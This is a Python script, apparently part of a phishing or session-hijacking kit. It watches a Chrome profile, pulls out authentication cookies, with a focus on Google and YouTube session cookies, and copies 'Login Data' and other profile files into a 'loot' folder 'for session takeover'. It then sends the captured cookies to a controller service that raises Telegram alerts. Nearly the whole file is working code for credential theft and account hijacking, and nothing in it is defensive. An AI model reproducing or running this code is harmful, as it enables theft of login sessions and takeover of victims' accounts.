#!/usr/bin/env python3
"""
Cookie Monitor for Chrome - Watches for cookies and session data
Sends alerts to controller for Telegram notifications
"""

import os
import sys
import time
import json
import sqlite3
import shutil
import requests
import hashlib
from pathlib import Path
from datetime import datetime

CHROME_PROFILE = Path("/root/.config/google-chrome/Default")
LOOT_DIR = Path("/app/loot")
CONTROLLER_URL = os.environ.get("CONTROLLER_URL", "http://controller:5000")
SESSION_ID = os.environ.get("SESSION_ID", "session_1")
CHECK_INTERVAL = 5  # seconds

sent_cookies_hash = ""


def get_chrome_cookies():
    """Extract cookies from Chrome's Cookies database"""
    cookies = []
    cookies_db = CHROME_PROFILE / "Cookies"
    
    if not cookies_db.exists():
        return cookies
    
    temp_db = Path("/tmp/cookies_copy.sqlite")
    try:
        shutil.copy2(cookies_db, temp_db)
        
        conn = sqlite3.connect(str(temp_db))
        conn.text_factory = lambda b: b.decode(errors='ignore')
        cursor = conn.cursor()
        
        # Chrome cookies table structure
        cursor.execute("""
            SELECT host_key, name, value, path, expires_utc, is_secure, is_httponly
            FROM cookies
        """)
        
        for row in cursor.fetchall():
            cookies.append({
                "domain": row[0],
                "name": row[1],
                "value": row[2],
                "path": row[3],
                "expiry": row[4],
                "secure": bool(row[5]),
                "httpOnly": bool(row[6])
            })
        
        conn.close()
    except Exception as e:
        print(f"Error reading cookies: {e}", file=sys.stderr)
    finally:
        if temp_db.exists():
            temp_db.unlink()
    
    return cookies


def check_for_interesting_cookies(cookies):
    """Check if cookies contain authentication tokens"""
    interesting_patterns = [
        "session", "auth", "token", "sid", "ssid", 
        "login", "user", "jwt", "access", "refresh",
        "oauth", "saml", "sso", "credential", "lsid",
        "hsid", "apisid", "sapisid", "secure-", "nid"
    ]
    
    interesting = []
    for cookie in cookies:
        name_lower = cookie["name"].lower()
        domain_lower = cookie["domain"].lower()
        
        # Check for Google auth cookies specifically
        if "google" in domain_lower or "youtube" in domain_lower:
            if any(p in name_lower for p in ["sid", "hsid", "ssid", "apisid", "sapisid", "lsid", "nid", "secure"]):
                interesting.append(cookie)
                continue
        
        # General auth patterns
        for pattern in interesting_patterns:
            if pattern in name_lower:
                interesting.append(cookie)
                break
    
    return interesting


def export_chrome_profile():
    """Export Chrome profile for session takeover"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    export_dir = LOOT_DIR / SESSION_ID / f"chrome_profile_{timestamp}"
    export_dir.mkdir(parents=True, exist_ok=True)
    
    important_files = [
        "Cookies",
        "Login Data",
        "Web Data",
        "History",
        "Preferences",
        "Secure Preferences",
        "Local State"
    ]
    
    # Copy from Default profile
    for item in important_files:
        src = CHROME_PROFILE / item
        if src.exists():
            try:
                shutil.copy2(src, export_dir / item)
            except Exception as e:
                print(f"Error copying {item}: {e}", file=sys.stderr)
    
    # Also copy Local State from parent
    local_state = CHROME_PROFILE.parent / "Local State"
    if local_state.exists():
        try:
            shutil.copy2(local_state, export_dir / "Local State")
        except:
            pass
    
    return str(export_dir)


def send_to_controller(data_type, data):
    """Send data to controller for Telegram alerts"""
    try:
        payload = {
            "session_id": SESSION_ID,
            "type": data_type,
            "timestamp": datetime.now().isoformat(),
            "data": data
        }
        
        response = requests.post(
            f"{CONTROLLER_URL}/api/report",
            json=payload,
            timeout=5
        )
        return response.status_code == 200
    except Exception as e:
        print(f"Error sending to controller: {e}", file=sys.stderr)
        return False


def main():
    global sent_cookies_hash
    
    print(f"Cookie monitor started for session {SESSION_ID}")
    print(f"Monitoring Chrome profile: {CHROME_PROFILE}")
    print(f"Controller URL: {CONTROLLER_URL}")
    
    # Ensure loot directory exists
    (LOOT_DIR / SESSION_ID).mkdir(parents=True, exist_ok=True)
    
    # Initial notification
    send_to_controller("session_start", {"status": "monitoring"})
    
    auth_detected = False
    
    while True:
        try:
            cookies = get_chrome_cookies()
            
            if cookies:
                cookies_hash = hashlib.md5(
                    json.dumps(cookies, sort_keys=True).encode()
                ).hexdigest()
                
                if cookies_hash != sent_cookies_hash:
                    sent_cookies_hash = cookies_hash
                    
                    # Save all cookies
                    cookies_file = LOOT_DIR / SESSION_ID / "cookies.json"
                    with open(cookies_file, "w") as f:
                        json.dump(cookies, f, indent=2)
                    
                    # Check for auth cookies
                    interesting = check_for_interesting_cookies(cookies)
                    
                    print(f"Total cookies: {len(cookies)}, Auth cookies: {len(interesting)}")
                    
                    if interesting and not auth_detected:
                        auth_detected = True
                        print(f"AUTH DETECTED! {len(interesting)} auth cookies found")
                        
                        # Send alert
                        send_to_controller("auth_cookies", {
                            "count": len(interesting),
                            "cookies": interesting[:10],  # First 10
                            "total_cookies": len(cookies)
                        })
                        
                        # Export profile
                        profile_path = export_profile()
                        send_to_controller("profile_exported", {
                            "path": profile_path
                        })
                    elif len(cookies) > 5:
                        send_to_controller("cookies_update", {
                            "count": len(cookies),
                            "auth_count": len(interesting)
                        })
        
        except Exception as e:
            print(f"Monitor error: {e}", file=sys.stderr)
        
        time.sleep(CHECK_INTERVAL)


def export_profile():
    """Wrapper for export"""
    return export_chrome_profile()


if __name__ == "__main__":
    main()
